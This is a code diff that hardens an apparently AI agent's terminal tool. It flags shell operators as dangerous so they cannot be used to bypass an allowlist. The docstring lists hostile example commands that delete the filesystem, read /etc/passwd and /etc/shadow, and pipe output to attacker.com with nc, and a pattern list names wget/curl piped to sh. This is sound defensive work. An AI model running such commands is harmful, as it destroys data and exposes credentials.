@@ -31,6 +31,9 @@ class TerminalTool(BaseTool):
         "wget.*curl.*sh",
     ]
 
+    # Shell 操作符 (A7 from OpenWorker) - 防止 allowlist 绕过
+    SHELL_OPERATORS = (";", "&", "|", ">", "<", "`", "$(", "(", "\n", "\r")
+
     def _build_schema(self) -> ToolSchema:
         return ToolSchema(
             name="terminal",
@@ -48,6 +51,23 @@ class TerminalTool(BaseTool):
             },
         )
 
+    def _has_shell_operators(self, command: str) -> bool:
+        """
+        检查命令是否包含 shell 操作符 (A7 from OpenWorker)
+
+        防止 allowlist 绕过，如：
+        - rm -rf / ; cat /etc/passwd
+        - ls | nc attacker.com 1234
+        - echo $(cat /etc/shadow)
+
+        Args:
+            command: 要执行的命令
+
+        Returns:
+            是否包含 shell 操作符
+        """
+        return any(op in command for op in self.SHELL_OPERATORS)
+
     def _is_dangerous(self, command: str) -> bool:
         """
         检查命令是否危险
@@ -59,6 +79,10 @@ class TerminalTool(BaseTool):
             是否危险
         """
         command_lower = command.lower()
+
+        # A7: 检查是否包含 shell 操作符（防止 allowlist 绕过）
+        if self._has_shell_operators(command):
+            return True
 
         # 检查是否包含危险模式
         for pattern in self.DANGEROUS_PATTERNS:
